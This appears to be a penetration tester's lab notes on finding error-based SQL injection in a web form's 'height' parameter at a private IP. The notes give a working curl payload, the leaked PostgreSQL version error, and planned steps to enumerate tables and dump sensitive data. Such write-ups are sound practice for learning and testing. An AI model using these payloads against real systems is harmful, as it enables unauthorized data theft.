# SQL Injection Progression - 192.168.145.49

## Target Information
- **IP**: 192.168.145.49
- **Service**: Web Application
- **Vulnerable Endpoint**: `/class.php`
- **Method**: POST request

## Discovery Phase

### 1. Initial Reconnaissance
```bash
# Found JavaScript includes in HTML source
curl http://192.168.145.49/mail/contact.js
curl http://192.168.145.49/js/main.js
```

### 2. Form Parameter Identification
- **Endpoint**: `http://192.168.145.49/class.php`
- **Parameters**: weight, height, age, gender, email

## Vulnerability Discovery

### 3. SQL Injection Test
```bash
curl -X POST -i http://192.168.145.49/class.php \
-d "weight=75&height=' AND 1=CONVERT(int,@@version)--&age=25&gender=male&email=test@test.com"
```

### 4. Confirmation Response
```
Warning: pg_query(): Query failed: ERROR: invalid input syntax for type integer:
"PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu,
compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit"
in /var/www/html/class.php on line 423
```

## Key Findings
- **Database**: PostgreSQL 13.7
- **OS**: Debian Linux (Debian 11)
- **Architecture**: x86_64
- **Vulnerability Type**: Error-based SQL Injection
- **Injectable Parameter**: `height`
- **Error Location**: Line 423 of class.php

## Exploitation Methodology

### Error-Based Extraction Technique
Using PostgreSQL's CONVERT function to force errors that reveal data:
- `CONVERT(int, [query])` - Forces type conversion error
- Error messages leak query results

## Next Steps
1. Extract database name: `current_database()`
2. Enumerate tables: `information_schema.tables`
3. Extract user privileges: `current_user`
4. Dump sensitive data
5. Test for file read/write capabilities

## Time Tracking
- Discovery: ~5 minutes
- Initial exploitation: ~2 minutes
- Full enumeration: Est. 15-20 minutes